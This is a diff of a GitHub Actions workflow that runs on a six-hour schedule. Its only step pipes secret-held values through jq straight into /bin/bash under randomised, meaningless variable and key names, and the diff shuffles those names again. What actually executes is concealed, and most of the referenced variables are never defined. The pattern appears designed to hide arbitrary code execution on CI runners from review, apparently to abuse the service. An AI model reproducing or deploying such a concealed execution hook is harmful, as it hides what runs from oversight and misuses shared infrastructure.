@@ -1,28 +1,35 @@
 name: guozhongren1234
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '53 4/6 * * *'
-jobs:  # 5766
+    - cron: '12 2/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: guozhongren1234
         env:
-          qgr1: ${{ secrets.qgr1 }}
+          xpk2: ${{ secrets.xpk2 }}
         run: |
-          echo $qgr1 | jq -r .c187 | /bin/bash
-          echo $wng94058 | jq -r .cpw74827 | /bin/bash
-          echo $hp0 | jq -r .c80 | /bin/bash
-          echo $z7 | jq -r .c198 | /bin/bash
-          echo $bmt6 | jq -r .gbuyl9567 | /bin/bash
-          echo $rvb4 | jq -r .hqdjv19151 | /bin/bash
-          echo $vekui3293 | jq -r .ciqx28496 | /bin/bash
-          echo $ga7 | jq -r .nfo1614 | /bin/bash
-          echo $a67 | jq -r .r5 | /bin/bash
-          echo $l0692 | jq -r .p9330 | /bin/bash
-          echo $w501 | jq -r .qdrt77 | /bin/bash
-          echo $i35215 | jq -r .mu70378 | /bin/bash
+          echo $xpk2 | jq -r .aao27 | /bin/bash
+          echo $ky6276 | jq -r .z22 | /bin/bash
+          echo $s1 | jq -r .zics925 | /bin/bash
+          echo $vvp418 | jq -r .go831 | /bin/bash
+          echo $q591 | jq -r .x1 | /bin/bash
+          echo $zhp70 | jq -r .lohsp736 | /bin/bash
+          echo $qf4478 | jq -r .sl6116 | /bin/bash
+          echo $en19 | jq -r .zlm14 | /bin/bash
+          echo $nspdl48 | jq -r .s71 | /bin/bash
+          echo $fm88 | jq -r .qejk12694 | /bin/bash
+          echo $jayxt88 | jq -r .wemif9260 | /bin/bash
+          echo $vku119 | jq -r .c539 | /bin/bash
+          echo $nvvwo631 | jq -r .qctsy10 | /bin/bash
+          echo $juod4820 | jq -r .ikz8 | /bin/bash
+          echo $ira78 | jq -r .p9 | /bin/bash
+          echo $tqd641 | jq -r .efll2 | /bin/bash
+          echo $xxf11162 | jq -r .j8 | /bin/bash
+          echo $e24 | jq -r .cntbb5 | /bin/bash
 
